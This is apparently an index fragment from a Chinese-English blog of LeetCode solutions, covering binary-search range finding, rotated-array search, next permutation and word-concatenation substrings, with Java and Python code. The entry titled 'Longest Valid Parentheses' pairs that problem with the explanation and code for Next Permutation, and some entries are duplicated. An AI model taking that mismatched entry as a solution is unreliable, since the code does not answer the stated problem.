class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] searchRange(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;        </span><br><span class="line">    <span class="comment">// starting and ending position of a given target value.</span></span><br><span class="line">    <span class="keyword">int</span> left, right;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> find = rank(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>, target);</span><br><span class="line">    <span class="keyword">if</span> (find &lt; <span class="number">0</span> || nums[find] != target) &#123;</span><br><span class="line">        left = -<span class="number">1</span>; right = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> findLeft = find;</span><br><span class="line">        <span class="keyword">while</span> (findLeft != <span class="number">0</span> &amp;&amp; nums[findLeft] == target)</span><br><span class="line">             findLeft = rank(nums, <span class="number">0</span>, findLeft - <span class="number">1</span>, target);</span><br><span class="line">        <span class="keyword">if</span> (nums[findLeft] == target) left = findLeft;</span><br><span class="line">        <span class="keyword">else</span> left = findLeft + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> findRight = find;</span><br><span class="line">        <span class="keyword">while</span> (findRight != nums.length - <span class="number">1</span> &amp;&amp;  nums[findRight] == target) &#123;</span><br><span class="line">            <span class="keyword">int</span> findRightRes = rank(nums, findRight + <span class="number">1</span>, nums.length - <span class="number">1</span>, target);</span><br><span class="line">            <span class="keyword">if</span> (findRightRes &lt; findRight + <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">            findRight = findRightRes;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nums[findRight] == target) right = findRight;</span><br><span class="line">        <span class="keyword">else</span> right = findRight - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;left, right&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * find the index of target.</span></span><br><span class="line"><span class="comment"> * return the index of target if find,</span></span><br><span class="line"><span class="comment"> * else return the index whose value is less than target.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">rank</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (hi + lo) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cmp = nums[mid] - target;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lo - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[33. Search in Rotated Sorted Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-33-Search-in-Rotated-Sorted-Array/</url>
      <content type="html"><![CDATA[<p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p>
<p>(i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p>
<p>You are given a target value to search. If found in the array return its index, otherwise return <code>-1</code>.</p>
<p>You may assume no duplicate exists in the array.</p>
<p>Your algorithm’s runtime complexity must be in the order of $O(\log n)$.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 0</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [4,5,6,7,0,1,2], target = 3</span><br><span class="line">Output: -1</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[33. Search in Rotated Sorted Array]]></title>
      <url>/wiki/2017/10/30/Leetcode-33-Search-in-Rotated-Sorted-Array/</url>
      <content type="html"><![CDATA[<p>Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.</p>
<p>(i.e., <code>[0,1,2,4,5,6,7]</code> might become <code>[4,5,6,7,0,1,2]</code>).</p>
<p>You are given a target value to search. If found in the array return its index, otherwise return -1.</p>
<p>You may assume no duplicate exists in the array.</p>
<p>Your algorithm’s runtime complexity must be in the order of $O(\log n$).</p>
<p>Example 1:</p>
<p>Input: <code>nums = [4,5,6,7,0,1,2], target = 0</code><br>Output: 4<br>Example 2:</p>
<p>Input: <code>nums = [4,5,6,7,0,1,2], target = 3</code><br>Output: -1</p>
<p>这道题是二分查找<code>Search Insert Position</code>的变体，看似有点麻烦，其实理清一下还是比较简单的。因为rotate的缘故，当我们切取一半的时候可能会出现误区，所以我们要做进一步的判断。具体来说，假设数组是A，每次左边缘为l，右边缘为r，还有中间位置是m。在每次迭代中，分三种情况：<br>（1）如果<code>target==A[m]</code>，那么m就是我们要的结果，直接返回；<br>（2）如果<code>A[m]&lt;A[r]</code>，那么说明从m到r一定是有序的（没有受到rotate的影响），那么我们只需要判断target是不是在m到r之间，如果是则把左边缘移到m+1，否则就target在另一半，即把右边缘移到m-1。<br>（3）如果<code>A[m]&gt;=A[r]</code>，那么说明从l到m一定是有序的，同样只需要判断target是否在这个范围内，相应的移动边缘即可。</p>
<p>根据以上方法，每次我们都可以切掉一半的数据，所以算法的时间复杂度是$O(\log n)$，空间复杂度是$O(1)$。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = len(nums)  - <span class="number">1</span></span><br><span class="line">        found = <span class="keyword">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> left &lt;= right <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            mid = (left + right ) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> left, right, mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> nums[mid] == target:</span><br><span class="line">                found = <span class="keyword">True</span></span><br><span class="line">                <span class="keyword">return</span> mid</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> nums[left] &lt;= nums[mid]:</span><br><span class="line">                <span class="keyword">if</span>  target &gt;= nums[left] <span class="keyword">and</span> target &lt; nums[mid]:</span><br><span class="line">                    right = mid - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span>  target &gt;= nums[mid] <span class="keyword">and</span> target &lt;= nums[right]:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    right = mid - <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[32. Longest Valid Parentheses]]></title>
      <url>/wiki/2017/10/30/Leetcode-32-Longest-Valid-Parentheses/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[Hard]</p>
<p>Given a string containing just the characters <code>&#39;(&#39;</code> and <code>&#39;)&#39;</code>, find the length of the longest valid (well-formed) parentheses substring.</p>
<p>For <code>&quot;(()&quot;</code>, the longest valid parentheses substring is <code>&quot;()&quot;</code>, which has length = 2.</p>
<p>Another example is <code>&quot;)()())&quot;</code>, where the longest valid parentheses substring is <code>&quot;()()&quot;</code>, which has length = 4.</p>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>实现下一个排列，将排列中的数字重新排列成字典序中的下一个更大的排列。</p>
<p>如果这样的重新排列是不可能的，它必须重新排列为可能的最低顺序（即升序排序）。</p>
<p>重排必须在原地，不分配额外的内存。</p>
<p>以下是一些示例，左侧是输入，右侧是输出：</p>
<p><code>1,2,3</code> → <code>1,3,2</code><br><code>3,2,1</code> → <code>1,2,3</code><br><code>1,1,5</code> → <code>1,5,1</code></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做题目前，应该先理解排列permuation的概念，以及next permutation的含义。例如题目例子里的<code>1，2，3</code>的全排列，依次是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2 3</span><br><span class="line">1 3 2</span><br><span class="line">2 1 3</span><br><span class="line">2 3 1</span><br><span class="line">3 1 2</span><br><span class="line">3 2 1</span><br></pre></td></tr></table></figure>
<p>next permuation的含义是从上面的第$i$行到第$i+1$行，如果是最后一行，则为第1行。</p>
<p>首先，应该了解到在前面变换数字，会导致排列增加很多，例如从<code>1 2 3</code>到 <code>3 2 1</code>。所以既然要找到比原来的数的排列大一点的数，自然是从后往前找。如果数组从尾到前是增加的，那么就表明，从尾到前增加的这几个数字已经是最大的排列了，不能增加了。所以，我们的目标是找到从尾到前是减小的数字。</p>
<p>假设数组从尾到前是增加的，然后在有一个地方出现了反转，例如数组：<code>[1，5，8，4，7，6，5，3，1]</code>在7和4的位置出现减小，我们需要做的就是找到该数字，将数字与最接近于并大于该数的数字交换(这里是5)。交换了以后，排列立刻增加了，但是后面的排列仍旧是非常大的。所以应该将之后的数组变成升序排列，也就是将后面的数的排列降到最低。可以分为下面三个步骤：</p>
<ul>
<li>从尾到前，找到反转点</li>
<li>从尾部向前找到后半区比该值（1）大的数，交换两个数</li>
<li>将后面的数组变成升序排列 </li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15207428802165.gif" alt="图片来自leetcode"></p>
<p>也就是说如果对于一个全排列$a_1,a_2,a_3,…,a_k$来说，如果满足$a_1 &lt; a_2 ≥ a_3 ≥ a_4 … ≥ a_k$（所有$a_1$开头的全排列中字典序最大的情况），就说明这个全排列的下一个全排列不能再由$a_1$开头，而是$a_1$在字典中的下一个元素$a_j$（即满足$a_j &gt; a_1$且$2 ≤ j ≤ k$的最小的$a_j$），由于任何$a_j$开头的全排列都大于$a_1$开头的全排列，所以我们寻找的全排列是$a_j$开头的最小的全排列。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nextPermutation</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: void Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 特殊情况，空的列表或只有一个元素</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 找到从尾到前开始减小的数的下标loc</span></span><br><span class="line">        loc = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>, n)):</span><br><span class="line">            <span class="comment"># 找到了</span></span><br><span class="line">            <span class="keyword">if</span>  nums[i<span class="number">-1</span>] &lt; nums[i]:</span><br><span class="line">                loc = i<span class="number">-1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 始终没有找到，即已经是最大排列，直接反转</span></span><br><span class="line">        <span class="keyword">if</span> loc <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            nums.reverse()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 找到了该数字，将数字与最接近于并大于该数的数字交换</span></span><br><span class="line">            larger_than_loc = filter(<span class="keyword">lambda</span> x: x &gt; nums[loc], nums[loc+<span class="number">1</span>:])</span><br><span class="line">            number_index = nums[loc+<span class="number">1</span>:].index(min(larger_than_loc)) + loc + <span class="number">1</span></span><br><span class="line">            nums[number_index], nums[loc] = nums[loc], nums[number_index]</span><br><span class="line">            <span class="comment"># 将后面的元素变成升序序列</span></span><br><span class="line">            nums[loc+<span class="number">1</span>:] = sorted(nums[loc+<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://shenjie1993.gitbooks.io/leetcode-python/031%20Next%20Permutation.html">https://shenjie1993.gitbooks.io/leetcode-python/031%20Next%20Permutation.html</a></li>
<li><a href="https://www.tianmaying.com/tutorial/LC31">https://www.tianmaying.com/tutorial/LC31</a></li>
<li><a href="https://leetcode.com/problems/next-permutation/solution/">https://leetcode.com/problems/next-permutation/solution/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[31. Next Permutation]]></title>
      <url>/wiki/2017/10/30/Leetcode-31-Next-Permutation/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[Medium]</p>
<p>Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers.</p>
<p>If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order).</p>
<p>The replacement must be in-place, do not allocate extra memory.</p>
<p>Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column.</p>
<p><code>1,2,3</code> → <code>1,3,2</code><br><code>3,2,1</code> → <code>1,2,3</code><br><code>1,1,5</code> → <code>1,5,1</code></p>
<h2 id="中文题目"><a href="#中文题目" class="headerlink" title="中文题目"></a>中文题目</h2><p>实现下一个排列，将排列中的数字重新排列成字典序中的下一个更大的排列。</p>
<p>如果这样的重新排列是不可能的，它必须重新排列为可能的最低顺序（即升序排序）。</p>
<p>重排必须在原地，不分配额外的内存。</p>
<p>以下是一些示例，左侧是输入，右侧是输出：</p>
<p><code>1,2,3</code> → <code>1,3,2</code><br><code>3,2,1</code> → <code>1,2,3</code><br><code>1,1,5</code> → <code>1,5,1</code></p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做题目前，应该先理解排列permuation的概念，以及next permutation的含义。例如题目例子里的<code>1，2，3</code>的全排列，依次是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 2 3</span><br><span class="line">1 3 2</span><br><span class="line">2 1 3</span><br><span class="line">2 3 1</span><br><span class="line">3 1 2</span><br><span class="line">3 2 1</span><br></pre></td></tr></table></figure>
<p>next permuation的含义是从上面的第$i$行到第$i+1$行，如果是最后一行，则为第1行。</p>
<p>首先，应该了解到在前面变换数字，会导致排列增加很多，例如从<code>1 2 3</code>到 <code>3 2 1</code>。所以既然要找到比原来的数的排列大一点的数，自然是从后往前找。如果数组从尾到前是增加的，那么就表明，从尾到前增加的这几个数字已经是最大的排列了，不能增加了。所以，我们的目标是找到从尾到前是减小的数字。</p>
<p>假设数组从尾到前是增加的，然后在有一个地方出现了反转，例如数组：<code>[1，5，8，4，7，6，5，3，1]</code>在7和4的位置出现减小，我们需要做的就是找到该数字，将数字与最接近于并大于该数的数字交换(这里是5)。交换了以后，排列立刻增加了，但是后面的排列仍旧是非常大的。所以应该将之后的数组变成升序排列，也就是将后面的数的排列降到最低。可以分为下面三个步骤：</p>
<ul>
<li>从尾到前，找到反转点</li>
<li>从尾部向前找到后半区比该值（1）大的数，交换两个数</li>
<li>将后面的数组变成升序排列 </li>
</ul>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15207428802165.gif" alt="图片来自leetcode"></p>
<p>也就是说如果对于一个全排列$a_1,a_2,a_3,…,a_k$来说，如果满足$a_1 &lt; a_2 ≥ a_3 ≥ a_4 … ≥ a_k$（所有$a_1$开头的全排列中字典序最大的情况），就说明这个全排列的下一个全排列不能再由$a_1$开头，而是$a_1$在字典中的下一个元素$a_j$（即满足$a_j &gt; a_1$且$2 ≤ j ≤ k$的最小的$a_j$），由于任何$a_j$开头的全排列都大于$a_1$开头的全排列，所以我们寻找的全排列是$a_j$开头的最小的全排列。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nextPermutation</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: void Do not return anything, modify nums in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        n = len(nums)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 特殊情况，空的列表或只有一个元素</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 找到从尾到前开始减小的数的下标loc</span></span><br><span class="line">        loc = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>, n)):</span><br><span class="line">            <span class="comment"># 找到了</span></span><br><span class="line">            <span class="keyword">if</span>  nums[i<span class="number">-1</span>] &lt; nums[i]:</span><br><span class="line">                loc = i<span class="number">-1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 始终没有找到，即已经是最大排列，直接反转</span></span><br><span class="line">        <span class="keyword">if</span> loc <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            nums.reverse()</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 找到了该数字，将数字与最接近于并大于该数的数字交换</span></span><br><span class="line">            larger_than_loc = filter(<span class="keyword">lambda</span> x: x &gt; nums[loc], nums[loc+<span class="number">1</span>:])</span><br><span class="line">            number_index = nums[loc+<span class="number">1</span>:].index(min(larger_than_loc)) + loc + <span class="number">1</span></span><br><span class="line">            nums[number_index], nums[loc] = nums[loc], nums[number_index]</span><br><span class="line">            <span class="comment"># 将后面的元素变成升序序列</span></span><br><span class="line">            nums[loc+<span class="number">1</span>:] = sorted(nums[loc+<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://shenjie1993.gitbooks.io/leetcode-python/031%20Next%20Permutation.html">https://shenjie1993.gitbooks.io/leetcode-python/031%20Next%20Permutation.html</a></li>
<li><a href="https://www.tianmaying.com/tutorial/LC31">https://www.tianmaying.com/tutorial/LC31</a></li>
<li><a href="https://leetcode.com/problems/next-permutation/solution/">https://leetcode.com/problems/next-permutation/solution/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[30. Substring with Concatenation of All Words]]></title>
      <url>/wiki/2017/10/30/Leetcode-30-Substring-with-Concatenation-of-All-Words/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>You are given a string, <em>s</em>, and a list of words, <strong>words</strong>, that are all of the same length. Find all starting indices of substring(s) in <strong>s</strong> that is a concatenation of each word in <strong>words</strong> exactly once and without any intervening characters.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">  s = &quot;barfoothefoobarman&quot;,</span><br><span class="line">  words = [&quot;foo&quot;,&quot;bar&quot;]</span><br><span class="line">Output: [0,9]</span><br><span class="line">Explanation: Substrings starting at index 0 and 9 are &quot;barfoor&quot; and &quot;foobar&quot; respectively.</span><br><span class="line">The output order does not matter, returning [9,0] is fine too.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">  s = &quot;wordgoodstudentgoodword&quot;,</span><br><span class="line">  words = [&quot;word&quot;,&quot;student&quot;]</span><br><span class="line">Output: []</span><br></pre></td></tr></table></figure>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>因为words中的单词可能有重复，所以要有一个dict来记录一下每个字符串的数目。然后在遍历原字符串的时候，只需要遍历单词的长度次即可，如”barfoothefoobarman”，因为目标单词的长度为3，所以只需遍历：</p>
<p>‘bar’ | ‘foo’ | ‘the’ | ‘foo’ | ‘bar’ | ‘man’<br>‘arf’ | ‘oot’ | ‘hef’ | ‘oob’ | ‘arm’<br>‘rfo’ | ‘oth’ | ‘efo’ | ‘oba’ | ‘rma’</p>
<p>在遍历时，需要两个指针，一个用来标记子字符串的开始，另一个用来标记子字符串的结束。再用一个dict来记录当前字符串中单词的数量，如果下一个单词不在words中，那么清空该dict，把前指针直接跳到后指针处；如果在words中，那么相应的键值要加一，此时如果那个单词的数量超过了目标中的数目，那么前指针要不断后移直到吐出一个那个单词。通过前后指针之差是否等于所有目标单词长度之和来判断是否有目标子字符串。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSubstring</span><span class="params">(self, s, words)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type s: str</span></span><br><span class="line"><span class="string">    :type words: List[str]</span></span><br><span class="line"><span class="string">    :rtype: List[int]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s_length = len(s)</span><br><span class="line">    word_num = len(words)</span><br><span class="line">    word_length = len(words[<span class="number">0</span>])</span><br><span class="line">    words_length = word_num * word_length</span><br><span class="line">    result = []</span><br><span class="line">    words_dict = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> words_dict:</span><br><span class="line">            words_dict[word] = words_dict[word] + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            words_dict[word] = <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(word_length):</span><br><span class="line">        <span class="comment"># 两个指针，left, right:</span></span><br><span class="line">        <span class="comment"># 一个用来标记子字符串的开始，另一个用来标记子字符串的结束</span></span><br><span class="line">        left = i</span><br><span class="line">        right = i</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># curr_dict 记录当前字符串中单词的数量</span></span><br><span class="line">        curr_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">while</span> right + word_length &lt;= s_length:</span><br><span class="line">            word = s[right: right + word_length] <span class="comment"># 取出单词</span></span><br><span class="line">            right += word_length</span><br><span class="line">            <span class="comment"># 如果在words中，那么相应的键值要加1</span></span><br><span class="line">            <span class="comment"># 此时如果那个单词的数量超过了目标中的数目，那么左指针要不断后移直到吐出一个那个单词。</span></span><br><span class="line">            <span class="keyword">if</span> word <span class="keyword">in</span> words_dict:</span><br><span class="line">                curr_dict[word] = curr_dict[word] + <span class="number">1</span> <span class="keyword">if</span> word <span class="keyword">in</span> curr_dict <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> curr_dict[word] &gt; words_dict[word]:</span><br><span class="line">                    curr_dict[s[left: left+word_length]] -= <span class="number">1</span></span><br><span class="line">                    left += word_length</span><br><span class="line">                <span class="comment"># 通过前后指针之差是否等于所有目标单词长度之和来判断是否有目标子字符串。</span></span><br><span class="line">                <span class="keyword">if</span> right - left == words_length:</span><br><span class="line">                    result.append(left)</span><br><span class="line">            <span 